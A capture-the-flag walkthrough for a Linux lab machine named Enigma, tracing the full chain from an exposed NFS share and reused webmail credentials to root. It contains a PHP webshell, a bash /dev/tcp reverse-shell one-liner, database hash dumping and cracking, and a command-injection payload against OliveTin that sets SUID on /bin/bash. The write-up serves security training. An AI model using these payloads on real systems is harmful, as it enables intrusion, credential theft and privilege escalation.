---
description: 'Difficulty: Medium  | OS: Linux'
---

# Enigma



***

### Attack Chain

```
NFS Enumeration → Exposed PDF (Employee Credentials) → Webmail Login
→ Password Reuse → Secondary Mailbox → OpenSTAManager Credentials
→ File Upload RCE (www-data) → Database Dump → Hash Cracking
→ Lateral Movement (haris) → OliveTin API Command Injection → Root
```

***

### 1. Reconnaissance

#### Full TCP Port Scan

```bash
# Attack machine
nmap -Pn -p- --min-rate 5000 -oA full_tcp 10.129.30.23
```

**Open ports:**

```
22/tcp   - SSH
80/tcp   - HTTP
110/tcp  - POP3
111/tcp  - RPCBind
143/tcp  - IMAP
993/tcp  - IMAPS
995/tcp  - POP3S
2049/tcp - NFS
```

***

### 2. NFS Share Enumeration

```bash
# Attack machine
sudo nmap --script=nfs-showmount,nfs-ls,nfs-statfs -p111,2049 10.129.30.23
```

**Output:**

```
| nfs-showmount:
|_  /srv/nfs/onboarding *
| nfs-ls: Volume /srv/nfs/onboarding
| PERMISSION  UID  GID  SIZE  FILENAME
| rw-r--r--   0    0    1751  New_Employee_Access.pdf
```

#### Mount and read the exposed file

```bash
# Attack machine
sudo mkdir -p /mnt/onboarding
sudo mount -t nfs -o vers=3,nolock 10.129.30.23:/srv/nfs/onboarding /mnt/onboarding
ls -la /mnt/onboarding
xdg-open /mnt/onboarding/New_Employee_Access.pdf
sudo umount -l /mnt/onboarding
```

The PDF (`New_Employee_Access.pdf`) contained initial employee credentials for the webmail service.

***

### 3. Webmail Access & Password Reuse

Used credentials from the PDF to log into webmail (IMAP/web interface on port 143/993).

* Discovered a second email containing credentials for another mailbox
* Logged into secondary mailbox
* Found **OpenSTAManager admin credentials** inside

***

### 4. OpenSTAManager — File Upload RCE

Navigated to `http://enigma.htb` and logged into OpenSTAManager as admin.

Exploited the file upload functionality to upload a PHP webshell:

```php
<?php system($_GET['c']); ?>
```

Saved as `SHELL.php` and uploaded via the manager interface.

#### Trigger reverse shell

```bash
# Attack machine — start listener
nc -lvnp 4444
```

```bash
# Attack machine — trigger reverse shell
curl "http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.133/4444+0>%261'"
```

**Shell received:**

```
listening on [any] 4444 ...
connect to [10.10.14.133] from (UNKNOWN) [10.129.30.23] 38434
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
www-data@enigma:~/html/openstamanager/files$
```

***

### 5. Extract Database Credentials & Dump Hashes

Found database credentials in OpenSTAManager config, then dumped the users table:

```bash
# Target — as www-data
mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e "SELECT * FROM zz_users;"
```

**Output:**

```
id  username  password                                                          email
1   admin     $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu   admin@enigma.htb
2   haris     $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC   haris@enigma.htb
```

***

### 6. Offline Password Cracking

```bash
# Attack machine
cat hashes.txt
# $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
# $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC

hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Cracked:**

```
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

Credentials: `haris:bestfriends`

***

### 7. Lateral Movement — User Shell

```bash
# Target — as www-data
su - haris
# Password: bestfriends

whoami
# haris
```

**User flag:**

```bash
cat /home/haris/user.txt
# b922673a81fbae8e94dda2b657974ba5
```

***

### 8. Internal Service Enumeration

```bash
# Target — as haris
ss -tlnp
```

Identified a locally listening service on port **1337**:

```
LISTEN  0  4096  127.0.0.1:1337  0.0.0.0:*
```

```bash
# Target — as haris
curl -s http://127.0.0.1:1337/
```

Identified as **OliveTin** — a web interface for running predefined shell commands.

***

### 9. Analyze OliveTin Config — Guest Execution Misconfiguration

```bash
# Target — as haris
cat /etc/OliveTin/config.yaml
```

**Key misconfigurations:**

```yaml
# Guests do not need to log in
authRequireGuestsToLogin: false

# Guests can execute actions
defaultPermissions:
  view: true
  exec: true
  logs: true

# Vulnerable action — db_pass type: password bypasses shell safety checks
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
      default: backup_svc
    - name: db_pass
      type: password        # <-- not sanitized, shell metacharacters allowed!
    - name: db_name
      type: ascii_identifier
      default: production
```

**OliveTin runs as root:**

```bash
# Target — as haris
ps aux | grep -i olive
# root  1516  ...  /usr/local/bin/OliveTin
```

***

### 10. Exploit — API Parameter Command Injection → Root

#### Step 1: Get the bindingId for Backup Database

```bash
# Target — as haris
curl -s -X POST http://127.0.0.1:1337/api/GetDashboard \
  -H "Content-Type: application/json" \
  -d '{}' | python3 -m json.tool 2>/dev/null | grep -i "binding\|backup"
```

**Output (relevant lines):**

```
"title": "Backup Database",
"bindingId": "backup_database",
```

#### Step 2: Inject into db\_pass to set SUID on /bin/bash

```bash
# Target — as haris
curl -s -X POST http://127.0.0.1:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d '{"bindingId":"backup_database","arguments":[
    {"name":"db_user","value":"backup_svc"},
    {"name":"db_pass","value":"x'\''||chmod u+s /bin/bash||echo '\''"},
    {"name":"db_name","value":"production"}
  ]}'
```

**Response:**

```json
{"executionTrackingId":"f087de1f-eff4-4449-8713-ddaec7e61f2f"}
```

The shell command executed by OliveTin (as root) becomes:

```bash
mysqldump -u backup_svc -p'x'||chmod u+s /bin/bash||echo '' production > /opt/backups/backup.sql
```

#### Step 3: Verify SUID and get root shell

```bash
# Target — as haris
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1446024 Mar 31 2024 /bin/bash

/bin/bash -p
whoami
# root
```

**Root flag:**

```bash
cat /root/root.txt
# 21d55add59e07abc9ccd90ec687d712e
```

***

### Credentials Summary

| Service        | Username   | Password     |
| -------------- | ---------- | ------------ |
| Webmail        | (from PDF) | (from PDF)   |
| OpenSTAManager | admin      | (from email) |
| MySQL          | brollin    | Fri3nds@9099 |
| SSH/System     | haris      | bestfriends  |

***

### Key Vulnerabilities & Lessons Learned

| Step      | Vulnerability                                                        | Impact               |
| --------- | -------------------------------------------------------------------- | -------------------- |
| Recon     | NFS share exposed to `*` (everyone)                                  | Sensitive PDF leaked |
| Foothold  | OpenSTAManager unrestricted file upload                              | RCE as www-data      |
| DB Access | Hardcoded DB credentials in config                                   | Full DB dump         |
| Privesc 1 | Weak bcrypt password cracked with rockyou                            | Shell as haris       |
| Privesc 2 | OliveTin guest exec + `password`-type arg injection (CVE-2026-27626) | Root shell           |

**Takeaways:**

* NFS shares exposed to `*` are a common source of credential leaks in real environments
* Always check for password reuse across discovered services
* Services bound to localhost are not automatically safe — lateral movement exposes them
* OliveTin's `password` argument type bypasses shell safety checks entirely
* Running OliveTin as root with `authRequireGuestsToLogin: false` and `exec: true` is a critical misconfiguration
* Use `bindingId` (not `actionId`) when calling the OliveTin `/api/StartAction` endpoint
